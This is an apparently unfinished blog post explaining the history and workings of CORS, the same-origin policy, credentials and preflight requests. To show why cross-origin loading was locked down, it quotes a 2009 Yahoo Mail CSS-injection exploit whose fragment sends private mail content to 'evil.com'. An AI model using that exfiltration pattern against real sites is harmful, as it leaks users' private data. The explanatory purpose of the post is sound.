---
title: 'CORS: The why and how'
date: 2021-09-22 01:00:00
summary: TODO
meta: TODO
#image: 'asset-url:./img.jpg'
---

Understanding CORS is hard. It's hard because it's part of how browsers fetch stuff, and that's a set of behaviours that started with the very first web browser, over thirty years ago, and has been a constant source of development; adding features, improving defaults, and papering over past mistakes without breaking too much of the web.

I'm going to try to explain why CORS is the way it is, by looking at how it came into existence, and how it fits into other kinds of fetches. Wish me luck…

# Cross-origin access without CORS

<blockquote class="quote"><p>I'd like to propose a new, optional HTML tag: IMG. Required argument is SRC="url".</p>– <a href="http://1997.webhistory.org/www.lists/www-talk.1993q1/0182.html">Marc Andreessen in 1993</a></blockquote>

Browsers have been able to include images from other sites for almost 30 years. You don't need the other site's permission to do this, you can just do it. And it didn't stop with images:

```html
<script src="…"></script>
<link rel="stylesheet" href="…" />
<iframe src="…"></iframe>
<video src="…"></video>
<audio src="…"></audio>
```

APIs like these let you make a request to another website and process the response in a particular way, without the other site's consent.

This started getting complicated in 1994 with the advent of HTTP cookies. HTTP cookies became part of a set of things we call _credentials_, which also includes TLS client certificates, and the state that automatically goes in the `Authorization` request header when using HTTP authentication (which no one really uses these days, because it's shite).

Credentials mean web content can be tailored for a particular user. It's how Twitter shows you _your_ feed, it's how your bank shows you _your_ accounts.

When you request other-site content using one of the methods above, it sends along the credentials for the other-site. And over the years that's created a colossal sackload of security issues.

```html
<img src="https://your-bank/your-profile/you.jpg" />
```

If the above image loads, I get a `load` event. If it doesn't load, I get an `error` event. If that differs depending on if you're logged in or not, that tells me a lot about you. I can also read the width and height of the image, which, if it differs from user to user, tells me even more.

This gets worse with a format like CSS, which has more capabilities, but doesn't immediately fail on parse errors. In 2009 it turned out Yahoo Mail was vulnerable to a fairly simple exploit. The attacker sends the user one email with a subject including `');}`, and later another with a subject including `{}html{background:url('//evil.com/?`. This means the user's mail page includes `{}html{background:url('//evil.com/?`, followed by some page source which includes their details and emails, followed by `');}`, which put together can form a valid chunk of CSS. Then, the attacker convinces the user to visit a page containing:

```html
<link rel="stylesheet" href="https://m.yahoo.com/mail" />
```

…which is loaded using `yahoo.com`'s cookies, the CSS parses, and sends private information to `evil.com`. Oh no.

# Locking things down

It's become pretty clear that the above was a mistake in the design of the web, so we no longer create APIs that can process these kinds of requests. Meanwhile, we've spent the last few decades patching things up as best we can:

- CSS from another origin (I'll get to a definition of that shortly) now needs to be sent with a CSS `Content-Type`. Unfortunately we can't enforce the same thing for scripts and images without breaking significant portions of the web. However…
- We prevent particular response types from another origin being loaded as image/script/etc, such as HTML, JSON, and XML (except SVG). This protection is called [CORB](https://fetch.spec.whatwg.org/#corb).
- More recently, we don't send cookies along with the request from site-A to site-B, unless site-B has opted-in using the [`SameSite` cookie attribute](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite). Without cookies, the site generally returns the 'logged-out' view, without private data.
- Firefox and Safari go a step further, and try to fully isolate sites, although how this works is currently pretty different between the two.

## The same-origin policy

Back in 1995, Netscape 2 landed with two amazing new features: LiveScript (you probably know this better as 'JavaScript'), and HTML frames. Frames let you embed one page in another, and LiveScript could interact with both pages.

Netscape realised that this presented a security issue, so they decided that cross-frame scripting would only be allowed if both pages had the same _origin_.

<style>
.origin-example {
  display: grid;
  grid-template-columns: max-content max-content;
}
.origin {
  grid-area: 1 / 1;
  color: #ff824a;
}
.path {
  grid-area: 1 / 2;
}
.origin-label {
  grid-area: 2 / 1;
  text-align: center;
  display: grid;
  grid-template-columns: 1fr max-content 1fr;
  align-items: top;
  gap: 0.3em;
  color: #ff824a;
}
.origin-label::before,
.origin-label::after {
  content: '';
  border: 1px solid currentcolor;
  height: 50%;
}
.origin-label::before {
  border-width: 0 0 1px 1px;
}
.origin-label::after {
  border-width: 0 1px 1px 0;
}
</style>

<div class="code-example"><pre class="language-xml"><code><div class="origin-example"><div aria-labelledby="origin-label" class="origin">https://jakearchibald.com:443</div><div class="path">/2021/blah/?foo#bar</div><div id="origin-label" class="origin-label">The origin</div></div></code></pre></div>

The idea was that sites on the same origin are more likely to have the same owner. That wasn't completely true, since a lot of sites divided content by URLs such as `http://example.com/~jakearchibald/`, but the line had to be drawn somewhere.

From that point, features that granted deep visibility into a resource were limited to same-origin. This included `new ActiveXObject('Microsoft.XMLHTTP')` which first appeared in IE5 in 1999, and later became the web standard `XMLHttpRequest`.

## Origins vs sites

Some web features don't deal with origins, they deal with 'sites'. For instance, `https://help.yourbank.com` and `https://profile.yourbank.com` are different origins, but they're the same site. Cookies are the most common feature that operate at a site level, as you can create cookies that are sent to all subdomains of `yourbank.com`.

But how does the browser know that `https://help.yourbank.com` and `https://profile.yourbank.com` are part of the same site, but `https://yourbank.co.uk` and `https://jakearchibald.co.uk` are different sites? I mean… they all have three parts separated by dots.

Well, the answer was a bunch of heuristics in each browser, but in 2007 Mozilla swapped their heuristics for a list. That list is now maintained as a separate community project known as the [public suffix list](https://publicsuffix.org/), and it's used by all browsers and many other projects.

If someone says they understand the security implications of URLs without UI hints, be sure to check they can recite all 9000+ entries of the public suffix list from memory.

# Opening things up again

Ok, so we've got these APIs like `<img>` that can access resources from other origins, but visibility into the response is limited (but not limited enough in hindsight), and we've got these more powerful APIs like cross-frame scripting and `XMLHttpRequest` which only work same-origin.

How could we allow those more powerful APIs to work _across_ origins?

## Remove credentials?

Let's say we provide an opt-in so the request is sent without credentials. The response will be the 'logged-out' view, so it won't contain any private data, and can be revealed without concern, right?

Unfortunately there's a lot of HTTP endpoints out there that 'secure' themselves using things other than browser credentials.

A lot of company intranets assume they're 'private' because they're only accessible from a particular network. Some routers and IoT devices assume they're only accessible by well-meaning folks because they're restricted to your home network (remember, the 's' in 'IoT' stands for security). Some websites offer different content depending on the IP address they're accessed from.

So, if you visit my website from your home, I could start making requests to common hostnames and IP addresses, looking for unsecure IoT devices, looking for routers using default passwords, and generally make your life very miserable, all without needing browser credentials.

Removing credentials is part of the solution, but it isn't enough on its own. There's no way to know that a resource contains private data without browser credentials, so we need some way for the resource to declare "hey, it's fine, let the other site read my content".

## Separate resource opt-in

The origin could have some special resource that details its permissions regarding cross-origin access. That's the [security model Flash went with](https://www.adobe.com/devnet-docs/acrobatetk/tools/AppSec/xdomain.html). Flash looked for a `/crossdomain.xml` in the root of the site that looked like this:

```xml
<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM "https://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
<cross-domain-policy>
  <site-control permitted-cross-domain-policies="master-only" />
  <allow-access-from domain="*.example.com" />
  <allow-access-from domain="www.example.com" />
  <allow-http-request-headers-from domain="*.adobe.com" headers="SOAPAction" />
</cross-domain-policy>
```

Unfortunately this is a bit all-or-nothing. You can imagine a similar format that lets you allow-list particular resources, but the resource would start to get quite large. It also means this potentially large resource would need to be downloaded before downloading the actual thing you want.

## In-resource opt-in

To cut down the number of requests, the opt-in could be granted within the resource itself. This technique was proposed by the W3C Voice Browser Working Group back in 2005, using an XML processing instruction:

```
<?access-control allow="*.example.com" deny="*.visitors.example.com"?>
```

But what if the resource wasn't XML? Well, the opt-in would need to be in a different format.

This is kinda where things landed for frame-to-frame communication. Both sides opt-in using [`postMessage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage), and can declare the origin they're happy to communicate with.

But what about accessing the raw bytes of the resource? In that case it doesn't make sense to use resource-specific metadata for the opt-in. And besides, HTTP already has a place for resource metadata…

## HTTP header opt-in

The proposal by the Voice Browser Working Group was generalised using HTTP headers, and that became CORS.

```
Access-Control-Allow-Origin: *
```

# Making a CORS request

Most modern web features require CORS by default, such as `fetch()`. The exception is modern features that are designed to support older features that don't use CORS, eg `<link rel="preload">`.

Unfortunately there's no easy rule here. For example:

```html
<!-- Not a CORS request -->
<script src="https://example.com/script.js"></script>
<!-- CORS request -->
<script type="module" src="https://example.com/script.js"></script>
```

The best way to figure it out is to try it and look at network DevTools. Cross-origin requests are sent with a [`Sec-Fetch-Mode` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Mode) which will tell you if it's a CORS request or not.

If an HTML element causes a no-CORS fetch, you can use the badly-named `crossorigin` attribute to switch it to a CORS request.

```html
<img crossorigin src="…" />
<script crossorigin src="…"></script>
<link crossorigin rel="stylesheet" href="…" />
<link crossorigin rel="preload" as="font" href="…" />
```

When you switch these over to CORS, you get more visibility into the cross-origin resource:

- You can paint the `<img>` to a `<canvas>` and read back the pixels.
- You get more detailed stack traces for script.
- You can explore the parsed stylesheet via [`link.sheet`](https://developer.mozilla.org/en-US/docs/Web/API/CSSStyleSheet).

With `<link rel="preload">`, you need to ensure it uses CORS if the eventual request will also use CORS, otherwise it won't match in the preload cache.

# CORS requests

By default, a cross-origin CORS request is made without credentials. So, no cookies, no client certs, and no automatic `Authorization` header. However, same-origin requests include credentials.

By the time CORS was developed, the `Referer` header was frequently spoofed or removed by browser extensions, so a new header, `Origin` was created, which provides the origin of the page that made the request.

`Origin` is generally useful, so it's been added to lots of other types of request, such as websocket and `POST` requests. We tried adding it to regular `GET` requests too, but it broke a bunch of sites that assumed the presence of the `Origin` header means it's a CORS request 😬. Maybe one day.

# CORS responses

To pass the CORS check and give the other origin access to the response, the response must include this header:

```
Access-Control-Allow-Origin: *
```

The `*` can be replaced with the value of the request's `Origin` header, but `*` works for any requesting origin provided the request is sent without credentials (more on that in a bit).

This give the other origin access to the response body, and also a subset of the headers:

- `Cache-Control`
- `Content-Language`
- `Content-Type`
- `Expires`
- `Last-Modified`
- `Pragma`

The response can include another header, `Access-Control-Expose-Headers`, to reveal additional headers, as long as they're not part of the [💀 FORBIDDEN LIST 💀](https://fetch.spec.whatwg.org/#forbidden-header-name), which are always hidden for security reasons.

```
Access-Control-Expose-Headers: Custom-Header-1, Custom-Header-2
```

# Is it safe to expose resources via CORS?

`Access-Control-Allow-Origin: *` only grants response visibility if the request is made without credentials, so it's totally safe to use on all resources _unless_ that resource contains private data that's 'secured' using something other than browser credentials.

If you _are_ securing things using something other than browser credentials, _stop doing that_. It's not actually secure.

Open the resource in an incognito/private browser tab. Are you happy with other sites having access to that, including the source and the response headers listed above? Then it's safe to expose it via CORS.

# Adding credentials

Cross-origin CORS requests are made without credentials by default. However, various APIs will allow you to add the credentials back in.

With fetch:

```js
const response = await fetch(url, {
  credentials: 'include',
});
```

Or with HTML elements:

```html
<img crossorigin="use-credentials" src="…" />
```

However, this makes the opt-in stronger. The response must contain:

```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://jakearchibald.com
```

If the CORS request includes credentials, the response must include the `Access-Control-Allow-Credentials: true` header, and the value of `Access-Control-Allow-Origin` must reflect the request's `Origin` header (`*` isn't an acceptable value if the request has credentials).

`Access-Control-Allow-Origin` must be a single value too. It can't be a comma-separated list of allowed values.

The opt-in is stronger because, well, exposing private data is risky, and should only be done for origins you really trust.

The same-site rules around cookies still apply, as do the kinds of isolation we see in Firefox and Safari. But these only come into effect cross-site, not cross-origin.

# Unusual requests and preflights

So far, the response has been opting into exposing its data. All of the _requests_ have been assumed to be safe, because they're not doing anything unusual.

```js
fetch(url, { credentials: 'include' });
```

There's nothing unusual about the above, because the request is really similar to what an `<img>` can do already.

```js
fetch(url, {
  method: 'POST',
  body: formData,
});
```

There's nothing unusual about the above, because the request is really similar to what a `<form>` can already do.

```js
fetch(url, {
  method: 'wibbley-wobbley',
  credentials: 'include',
  headers: {
    fancy: 'headers',
    'here-we': 'go',
  },
});
```

Ok, that's pretty unusual.

What counts as 'unusual' is pretty complicated, but at a high level, if it's the kind of request that other browser APIs don't generally make, then it's unusual. At a lower level, if the request method isn't `GET`, `HEAD`, or `POST`, or it includes headers or header values that aren't part of the [safelist](https://fetch.spec.whatwg.org/#cors-safelisted-request-header), then it counts as unusual.

If you try to make an unusual request, the browser first asks the other origin if it's ok to send it. This process is called a _preflight_.

## Preflight request

Before making the main request, the browser makes a preflight request to the destination URL with a method of `OPTIONS`, and headers like this:

```
Access-Control-Request-Method: wibbley-wobbley
Access-Control-Request-Headers: fancy, here-we
```

- `Access-Control-Request-Method` - The HTTP method that the main request will use. This is included even if the method isn't unusual.
- `Access-Control-Request-Headers` - The unusual headers that the main request will use. If there are no unusual headers, this header isn't sent.

The preflight request never includes credentials, even if the main request will.

## Preflight response

The server responds to indicate whether its happy for the main request to go ahead, using headers like this:

```
Access-Control-Allow-Methods: wibbley-wobbley
Access-Control-Allow-Headers: fancy, here-we
```

- `Access-Control-Allow-Methods` - The _unusual_ methods to allow. This can be a comma-separated list. If the main request is to be sent without credentials, this can be `*` to allow any method.
- `Access-Control-Allow-Headers` - The _unusual_ headers to allow. If the main request is to be sent without credentials, this can be `*` to allow any [not-forbidden](https://fetch.spec.whatwg.org/#forbidden-header-name) header.

The preflight response must also pass a regular CORS check, so it needs `Access-Control-Allow-Origin`, and also `Access-Control-Allow-Credentials: true` if the main request is to be sent with credentials.

If the intended method is allowed, and all the intended headers are allowed, then the main request goes ahead.

Oh, and the preflight only gives the go-ahead for the request. The eventual response must also pass a CORS check.

# TODO

- Outro
- Access-Control-Max-Age on preflight responses
- Correct Vary header usage
